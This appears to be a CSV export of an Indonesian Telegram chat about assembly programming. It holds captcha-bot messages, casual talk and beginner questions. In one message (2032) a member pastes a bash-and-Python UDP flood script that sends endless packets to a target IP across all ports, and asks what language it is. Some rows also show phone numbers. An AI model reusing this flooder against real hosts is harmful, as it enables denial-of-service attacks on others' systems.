+1799,1796,kalo gitu ini 350% dong,16,12,2019,14,1,48,Iwan,Aldiansyah,0,ThefoxAzubirs
+1800,0,"ga begitu ngitungnya...,\nsesuatu yg mau dibagi HARUS dinyatakan dulu 100%\nbaru dibagi2 deh tuh sesuatunya\n\nKenapa hukum waris dinyatakan dalam pecahan begitu? karena jumlah anak berbeda2, jumlah istri berbeda2...jadi kalo nambah istri tinggal ditambah hak warisnya. Nanti kalo udah meninggal naru diketahui jumlah totalnya berapa....nah total itulah yg harus 100%",16,12,2019,14,10,35,Iwan,Aldiansyah,0,ThefoxAzubirs
+1801,1796,Ini maksudnya 1+1 itu bukan 1+1= 2. Tapi bagian yg nantiny bakal dibuat rasionya,16,12,2019,14,41,33,∞[····–––···––··––],NF,0,Kakatuahitam
+1802,0,,17,12,2019,4,34,47,faco,,0,jalesveva
+1804,0,omg,17,12,2019,4,36,49,faco,,0,jalesveva
+1805,1804,Wrong answer!,17,12,2019,4,36,51,Ice Tea,,0,MyIceTea_Bot
+1806,0,mana gw tau,17,12,2019,4,37,4,faco,,0,jalesveva
+1808,1806,Wrong answer!,17,12,2019,4,37,5,Ice Tea,,0,MyIceTea_Bot
+1810,0,[faco](tg://user?id=70739279) (@jalesveva) has been kicked from the group due to failed to answer the captcha.,17,12,2019,4,39,54,Ice Tea,,0,MyIceTea_Bot
+1811,0,apa capcay nya,17,12,2019,4,42,18,Iwan,Aldiansyah,0,ThefoxAzubirs
+1812,0,,17,12,2019,4,44,1,Elend,,0,Elendx
+1814,0,,17,12,2019,4,44,21,Matahari,15million,0,Matahari15m
+1815,0,fkt,17,12,2019,4,44,51,,,0,
+1816,0,hui,17,12,2019,4,44,54,,,0,
+1817,0,[Muhamad](tg://user?id=591893125) (@Elendx) has been kicked from the group due to failed to answer the captcha.,17,12,2019,4,49,7,Ice Tea,,0,MyIceTea_Bot
+1818,0,,17,12,2019,4,49,35,Bruh,,0,muehehe_bot
+1820,0,[riam wisnu](tg://user?id=621061956) (@MbahJiman2000) has been kicked from the group due to failed to answer the captcha.,17,12,2019,4,49,57,Ice Tea,,0,MyIceTea_Bot
+1821,0,two?,17,12,2019,4,51,15,Iwan,Aldiansyah,0,ThefoxAzubirs
+1822,0,[Falkon](tg://user?id=585770759) (@Xfrozt) has been kicked from the group due to failed to answer the captcha.,17,12,2019,4,54,42,Ice Tea,,0,MyIceTea_Bot
+1823,0,,17,12,2019,5,2,40,Satria Ady,Pradana,0,xathrya
+1825,0,0,17,12,2019,5,7,11,Satria Ady,Pradana,0,xathrya
+1826,1825,Wrong answer!,17,12,2019,5,7,12,Ice Tea,,0,MyIceTea_Bot
+1827,0,[Satria Ady Pradana](tg://user?id=20945079) (@xathrya) has been kicked from the group due to failed to answer the captcha.,17,12,2019,5,7,47,Ice Tea,,0,MyIceTea_Bot
+1828,0,,17,12,2019,5,8,36,R,White Tea,0,UsirNama
+1830,0,[R White Tea](tg://user?id=616145015) (@UsirNama) has been kicked from the group due to failed to answer the captcha.,17,12,2019,5,14,24,Ice Tea,,0,MyIceTea_Bot
+1831,0,,17,12,2019,5,23,24,Defryan,Surya,0,alexsandriyan
+1833,1832,jawab,17,12,2019,5,25,16,Iwan,Aldiansyah,0,ThefoxAzubirs
+1834,0,[Defryan Surya](tg://user?id=661231866) (@alexsandriyan) has been kicked from the group due to failed to answer the captcha.,17,12,2019,5,28,31,Ice Tea,,0,MyIceTea_Bot
+1835,0,96 ya?,17,12,2019,5,28,43,Iwan,Aldiansyah,0,ThefoxAzubirs
+1836,0,6.4.4,17,12,2019,5,29,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+1837,0,,17,12,2019,5,56,7,Yuga,,6281336066154,jerukitumanis
+1839,0,0,17,12,2019,5,57,0,Yuga,,6281336066154,jerukitumanis
+1840,1839,Wrong answer!,17,12,2019,5,57,2,Ice Tea,,0,MyIceTea_Bot
+1841,0,[Yuga](tg://user?id=602977267) (@jerukitumanis) has been kicked from the group due to failed to answer the captcha.,17,12,2019,6,1,13,Ice Tea,,0,MyIceTea_Bot
+1842,0,,17,12,2019,8,0,6,,,0,
+1845,1844,[Muhammad Zaky](tg://user?id=) (@zaky0817) has answered the captcha correctly. Welcome to the group!,17,12,2019,8,0,19,Ice Tea,,0,MyIceTea_Bot
+1846,0,,18,12,2019,5,17,24,👁👁,,0,Jaaaaaaaack
+1848,0,[Jack](tg://user?id=224219531) (@Jaaaaaaaack) has been kicked from the group due to failed to answer the captcha.,18,12,2019,5,22,28,Ice Tea,,0,MyIceTea_Bot
+1849,0,,18,12,2019,5,22,46,👁👁,,0,Jaaaaaaaack
+1851,0,0,18,12,2019,5,23,36,👁👁,,0,Jaaaaaaaack
+1852,1851,Wrong answer!,18,12,2019,5,23,38,Ice Tea,,0,MyIceTea_Bot
+1853,0,96,18,12,2019,5,23,41,👁👁,,0,Jaaaaaaaack
+1854,1853,Wrong answer!,18,12,2019,5,23,43,Ice Tea,,0,MyIceTea_Bot
+1855,0,1,18,12,2019,5,23,55,👁👁,,0,Jaaaaaaaack
+1856,1855,[Jack](tg://user?id=) (@Jaaaaaaaack) has answered the captcha correctly. Welcome to the group!,18,12,2019,5,23,56,Ice Tea,,0,MyIceTea_Bot
+1857,0,,18,12,2019,8,30,39,Ahmad,Alfi,0,ahmad_alfi
+1860,1859,[Ahmad Alfi](tg://user?id=) (@ahmad_alfi) has answered the captcha correctly. Welcome to the group!,18,12,2019,8,31,37,Ice Tea,,0,MyIceTea_Bot
+1861,0,,18,12,2019,16,29,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+1862,1861,agar lebih memahami arti sesungguhnya dari stack,18,12,2019,16,30,18,Iwan,Aldiansyah,0,ThefoxAzubirs
+1863,0,,19,12,2019,12,58,54,Fadhil,M,0,GLUE_12
+1865,1864,Wait please I am working on it,19,12,2019,13,2,27,Fadhil,M,0,GLUE_12
+1866,1865,Wrong answer!,19,12,2019,13,2,28,Ice Tea,,0,MyIceTea_Bot
+1867,0,[Fadhili Lunguya](tg://user?id=728445438) has been kicked from the group due to failed to answer the captcha.,19,12,2019,13,5,0,Ice Tea,,0,MyIceTea_Bot
+1868,0,,19,12,2019,13,6,12,Fadhil,M,0,GLUE_12
+1871,0,2?,19,12,2019,13,8,54,∞[····–––···––··––],NF,0,Kakatuahitam
+1872,0,[Fadhili Lunguya](tg://user?id=728445438) has been kicked from the group due to failed to answer the captcha.,19,12,2019,13,12,1,Ice Tea,,0,MyIceTea_Bot
+1873,0,,20,12,2019,0,11,21,,,0,
+1875,0,[Sama](tg://user?id=1018112472) has been kicked from the group due to failed to answer the captcha.,20,12,2019,0,16,33,Ice Tea,,0,MyIceTea_Bot
+1879,1878,Wrong answer!,20,12,2019,7,57,41,Ice Tea,,0,MyIceTea_Bot
+1881,1880,Wrong answer!,20,12,2019,7,57,54,Ice Tea,,0,MyIceTea_Bot
+1884,1882,Wrong answer!,20,12,2019,7,57,57,Ice Tea,,0,MyIceTea_Bot
+1886,1883,Wrong answer!,20,12,2019,7,57,58,Ice Tea,,0,MyIceTea_Bot
+1887,1885,Wrong answer!,20,12,2019,7,57,59,Ice Tea,,0,MyIceTea_Bot
+1889,1888,Wrong answer!,20,12,2019,7,58,20,Ice Tea,,0,MyIceTea_Bot
+1892,1891,[Ksatria Dharma Aldzikri](tg://user?id=) (@Justcallksatria) has answered the captcha correctly. Welcome to the group!,20,12,2019,8,1,41,Ice Tea,,0,MyIceTea_Bot
+1893,0,/cyf4 \Pi + \exp,20,12,2019,8,8,54,Iwan,Aldiansyah,0,ThefoxAzubirs
+1894,1893,Invalid data!,20,12,2019,8,8,56,Ice Tea,,0,MyIceTea_Bot
+1895,0,/cyf4 \int \int \int x^4 y^6 z^2 d x dy dz,20,12,2019,8,9,51,Iwan,Aldiansyah,0,ThefoxAzubirs
+1896,1895,Invalid data!,20,12,2019,8,9,52,Ice Tea,,0,MyIceTea_Bot
+1897,0,/cyf4 \int x dx,20,12,2019,8,20,1,Iwan,Aldiansyah,0,ThefoxAzubirs
+1898,1897,Calculating...,20,12,2019,8,20,2,Ice Tea,,0,MyIceTea_Bot
+1899,1897,```plot [//math:\int x dx//]```,20,12,2019,8,20,8,Ice Tea,,0,MyIceTea_Bot
+1900,0,/cyf4 \int \int x^2 y^2 dxdy,20,12,2019,8,20,50,Iwan,Aldiansyah,0,ThefoxAzubirs
+1901,1900,Calculating...,20,12,2019,8,20,52,Ice Tea,,0,MyIceTea_Bot
+1902,1900,```plot [//math:\int \int x^2 y^2 dxdy//]```,20,12,2019,8,20,59,Ice Tea,,0,MyIceTea_Bot
+1903,0,/cyf4 \int \int x^4 y^4 z^4 dxdydz,20,12,2019,8,21,44,Iwan,Aldiansyah,0,ThefoxAzubirs
+1904,1903,Calculating...,20,12,2019,8,21,46,Ice Tea,,0,MyIceTea_Bot
+1905,1903,```plot [//math:\int \int x^4 y^4 z^4 dxdydz//]```,20,12,2019,8,22,4,Ice Tea,,0,MyIceTea_Bot
+1906,0,,20,12,2019,11,24,21,adymaz,,0,lawlietchang
+1908,0,[adymas m](tg://user?id=356021985) (@lawlietchang) has been kicked from the group due to failed to answer the captcha.,20,12,2019,11,29,26,Ice Tea,,0,MyIceTea_Bot
+1909,0,,20,12,2019,11,58,22,adymaz,,0,lawlietchang
+1911,1910,∞,20,12,2019,11,59,35,adymaz,,0,lawlietchang
+1912,1911,Wrong answer!,20,12,2019,11,59,36,Ice Tea,,0,MyIceTea_Bot
+1913,0,[adymas m](tg://user?id=356021985) (@lawlietchang) has been kicked from the group due to failed to answer the captcha.,20,12,2019,12,3,28,Ice Tea,,0,MyIceTea_Bot
+1914,0,,22,12,2019,8,23,32,fauzan,maghribi,0,afmaghribi
+1916,0,160,22,12,2019,8,27,11,fauzan,maghribi,0,afmaghribi
+1917,1916,Wrong answer!,22,12,2019,8,27,12,Ice Tea,,0,MyIceTea_Bot
+1918,0,20,22,12,2019,8,27,47,fauzan,maghribi,0,afmaghribi
+1919,1918,[Nangiiid](tg://user?id=) (@afmaghribi) has answered the captcha correctly. Welcome to the group!,22,12,2019,8,27,49,Ice Tea,,0,MyIceTea_Bot
+1920,0,@afmaghribi hi,22,12,2019,11,0,18,Iwan,Aldiansyah,0,ThefoxAzubirs
+1921,0,Hii,22,12,2019,13,10,56,fauzan,maghribi,0,afmaghribi
+1922,0,Ini grup bahas Indonesia kan ya?,22,12,2019,13,11,21,fauzan,maghribi,0,afmaghribi
+1923,0,Coba ke atas aja... Scroll mb,22,12,2019,14,4,51,∞[····–––···––··––],NF,0,Kakatuahitam
+1924,1922,"Kalau Pinned message nya dibaca dulu, jawabannya sudah jelas.",22,12,2019,14,19,43,Andy,Prasetya,0,andyprasetya
+1925,0,,22,12,2019,14,40,41,Iwan,Aldiansyah,0,ThefoxAzubirs
+1928,0,,22,12,2019,14,42,4,Iwan,Aldiansyah,0,ThefoxAzubirs
+1931,0,,22,12,2019,14,42,56,Iwan,Aldiansyah,0,ThefoxAzubirs
+1934,0,,22,12,2019,14,43,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+1936,1920,Ko bru join wk,22,12,2019,14,44,21,∞[····–––···––··––],NF,0,Kakatuahitam
+1938,0,,22,12,2019,14,44,45,Iwan,Aldiansyah,0,ThefoxAzubirs
+1940,0,Left dulu cri soal gampang wk,22,12,2019,14,45,3,∞[····–––···––··––],NF,0,Kakatuahitam
+1943,1939,anjay apa2an 😂😂,22,12,2019,14,45,20,Hei,,0,phyxkal
+1945,0,,22,12,2019,14,45,44,Iwan,Aldiansyah,0,ThefoxAzubirs
+1948,0,,22,12,2019,14,47,10,Iwan,Aldiansyah,0,ThefoxAzubirs
+1950,0,Pke photomath,22,12,2019,14,47,20,∞[····–––···––··––],NF,0,Kakatuahitam
+1954,0,,22,12,2019,14,48,10,Iwan,Aldiansyah,0,ThefoxAzubirs
+1959,0,,22,12,2019,14,52,1,Iwan,Aldiansyah,0,ThefoxAzubirs
+1963,0,gile....cepet banget timing nya,22,12,2019,14,53,19,Iwan,Aldiansyah,0,ThefoxAzubirs
+1964,1950,Kebaca g nih selama diintrograsi? Wk,22,12,2019,14,55,17,∞[····–––···––··––],NF,0,Kakatuahitam
+1965,0,Ko left sih,22,12,2019,14,55,19,∞[····–––···––··––],NF,0,Kakatuahitam
+1966,1940,soalnya udah gampang.....timmingnya itu lho....,22,12,2019,14,58,11,Iwan,Aldiansyah,0,ThefoxAzubirs
+1967,0,tapi lama2 kok kayaknya malah jadi hapal kalau sering2 tes,22,12,2019,14,59,41,Iwan,Aldiansyah,0,ThefoxAzubirs
+1969,1967,"Jdi, captcha ini fungsinya dh efektif? Wk",22,12,2019,15,2,14,∞[····–––···––··––],NF,0,Kakatuahitam
+1970,1969,Aku captcha pake ngerjainnya pake intuisi sih :v,22,12,2019,17,17,11,fauzan,maghribi,0,afmaghribi
+1971,0,,22,12,2019,23,58,0,Iwan,Aldiansyah,0,ThefoxAzubirs
+1975,0,,23,12,2019,2,55,10,Febri,,0,febnug
+1978,0,,23,12,2019,2,56,36,Febri,,0,febnug
+1981,0,,23,12,2019,3,0,47,Febri,,0,febnug
+1984,0,,23,12,2019,3,3,28,Febri,,0,febnug
+1987,0,,23,12,2019,3,4,12,Febri,,0,febnug
+1990,0,,23,12,2019,3,4,54,Febri,,0,febnug
+1993,0,,23,12,2019,3,5,34,Febri,,0,febnug
+1996,0,,23,12,2019,3,6,49,Febri,,0,febnug
+1999,0,,23,12,2019,3,7,36,Febri,,0,febnug
+2002,0,,23,12,2019,3,8,39,Febri,,0,febnug
+2005,1970,iya bener intuisi lebih baik kayaknya coz ane bandingin selama ini ane jawabnya lewat mimpi.....begitu ada jawaban eh ga taunya udah dikick....,23,12,2019,3,22,16,Iwan,Aldiansyah,0,ThefoxAzubirs
+2006,0,,23,12,2019,3,25,10,Febri,,0,febnug
+2009,2005,Wkowkwo,23,12,2019,8,45,27,fauzan,maghribi,0,afmaghribi
+2010,0,,23,12,2019,8,53,38,Iwan,Aldiansyah,0,ThefoxAzubirs
+2011,0,wkwwk....kerekam sendiri,23,12,2019,9,6,12,Iwan,Aldiansyah,0,ThefoxAzubirs
+2012,0,Ops,23,12,2019,9,6,35,Ammar Faizi,,0,ammarfaizi2
+2013,0,misi mau tanya,24,12,2019,7,6,33,Hei,,0,phyxkal
+2014,0,kalo syscall read itu taruh inputannya dmna ya?,24,12,2019,7,7,6,Hei,,0,phyxkal
+2015,0,di rsi kah?,24,12,2019,7,7,19,Hei,,0,phyxkal
+2016,0,di mesin 64 bit,24,12,2019,7,7,58,Hei,,0,phyxkal
+2021,2014,"sama dengan syscall write. Bedanya Yg write buat tulis pesan, yg read buat baca pesan",24,12,2019,7,43,15,Iwan,Aldiansyah,0,ThefoxAzubirs
+2022,0,oke mksh banyak om,24,12,2019,7,43,33,Hei,,0,phyxkal
+2023,0,mau tanya lagi,24,12,2019,7,45,52,Hei,,0,phyxkal
+2024,0,kalau inputan lewat argumen(arg)  di assembly gmna ya operasinya?,24,12,2019,7,46,16,Hei,,0,phyxkal
+2025,0,atau nyimpennya dmna?,24,12,2019,7,46,26,Hei,,0,phyxkal
+2026,0,di ebx ya?,24,12,2019,7,51,26,Hei,,0,phyxkal
+2027,2024,argv yang di c,24,12,2019,7,56,59,Hei,,0,phyxkal
+2031,0,,26,12,2019,7,23,19,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+2032,0,"figlet Welcome To My Tools | lolcat\necho ""<===================================>"" | lolcat\necho ""Author :Silver.fsh                  "" | lolcat\necho ""Team   :Cyber Fsh Team"" | lolcat\necho ""Tools  :hmmm bau kemem"" | lolcat\necho "" WHATSAPP: 088220221988"" | lolcat\necho ""<===================================>"" | lolcat\nimport sys\nimport os\nimport time\nimport socket\nimport random\n#Code Time\nfrom datetime import datetime\nnow = datetime.now()\nhour = now.hour\nminute = now.minute\nday = now.day\nmonth = now.month\nyear = now.year\n\n##############\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbytes = random._urandom(1490)\n#############\n\nos.system(""clear"")\nos.system(""figlet Sedang Menonjok System"")\nprint\nprint ""Author   : Silver.fsh""\nprint ""TEAM     :Cyber Fsh Team\nprint ""Thanks  : Klean Semwaa""\nprint ""Tingkat  : Legends""\nprint\nip = raw_input(""IP Target : "")\nport = input(""Port       : "")\n\nos.system(""clear"")\nos.system(""figlet Penonjokan Starting"")\nprint ""[                    ] 0% ""\ntime.sleep(5)\nprint ""[=====               ] 25%""\ntime.sleep(5)\nprint ""[==========          ] 50%""\ntime.sleep(5)\nprint ""[===============     ] 75%""\ntime.sleep(5)\nprint ""[====================] 100%""\ntime.sleep(3)\nsent = 0\nwhile True:\n     sock.sendto(bytes, (ip,port))\n     sent = sent + 1\n     port = port + 1\n     print ""Sent %s packet to %s throught port:%s""%(sent,ip,port)\n     if port == 65534:\n       port = 1\n\n\nini assembly?'-'",27,12,2019,2,22,39,,,0,
+2033,0,"Sepertinya yang bagian atas Bash, yang bawah python",27,12,2019,6,8,37,fauzan,maghribi,0,afmaghribi
+2039,0,,28,12,2019,3,34,40,Iwan,Aldiansyah,0,ThefoxAzubirs
+2043,0,Wah Bahasa Dewa Ini Assembly,28,12,2019,3,38,24,Host,Xyz,0,HostXyz
+2044,0,,28,12,2019,3,38,29,Host,Xyz,0,HostXyz
+2045,2038,Hello I'm newbie on assembly programming but I really want to help you. So......just show what is the problem. Perhaps other friends can help. How can we help if you don't show what the problem is,28,12,2019,3,42,29,Iwan,Aldiansyah,0,ThefoxAzubirs
+2046,2032,"mencirikan assembly itu mudah kok, Kalo ada register maka itu assembly. (i dont know in wasm)",28,12,2019,3,46,35,Iwan,Aldiansyah,0,ThefoxAzubirs
+2047,2033,Aq juga berpikir kayak gitu,28,12,2019,3,50,44,,,0,
+2048,2046,"i see, makasih om",28,12,2019,3,51,40,,,0,
+2050,2049,I understand what you want. So what have you done for it?,28,12,2019,6,0,53,Iwan,Aldiansyah,0,ThefoxAzubirs
+2053,0,well.....\ni think you know what you have to do now.....\nhappy weekend and happy new year.....,28,12,2019,8,13,58,Iwan,Aldiansyah,0,ThefoxAzubirs
+2058,0,Siap siap,31,12,2019,5,3,15,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+2060,0,Nah,31,12,2019,5,3,19,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+2061,0,Selamat mengerjakan,31,12,2019,5,3,32,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+2090,0,0,31,12,2019,9,21,47,∞[····–––···––··––],NF,0,Kakatuahitam
+2097,0,e,31,12,2019,9,26,32,Iwan,Aldiansyah,0,ThefoxAzubirs
+2099,0,,31,12,2019,9,27,7,Iwan,Aldiansyah,0,ThefoxAzubirs
+2100,0,tadi jawabannya mestinya berapa @ammarfaizi2 ?,31,12,2019,9,27,30,Iwan,Aldiansyah,0,ThefoxAzubirs
+2116,0,pyuh...,31,12,2019,9,52,10,Iwan,Aldiansyah,0,ThefoxAzubirs
+2117,2113,heheh,31,12,2019,9,53,12,Iwan,Aldiansyah,0,ThefoxAzubirs
+2118,0,,31,12,2019,9,55,37,,,0,
+2119,0,cheatsheet page 4 number 9i,31,12,2019,9,55,51,Iwan,Aldiansyah,0,ThefoxAzubirs
+2122,0,,31,12,2019,9,58,38,,,0,
+2123,0,`int 21h`,31,12,2019,9,58,55,,,0,
+2124,2123,wah.... legend.... asm 16 bit,31,12,2019,9,59,26,Iwan,Aldiansyah,0,ThefoxAzubirs
+2126,0,ngumpet di stack,31,12,2019,9,59,37,,,0,
+2129,2126,"berarti baru di pop, jadi keluar",31,12,2019,10,0,44,Iwan,Aldiansyah,0,ThefoxAzubirs
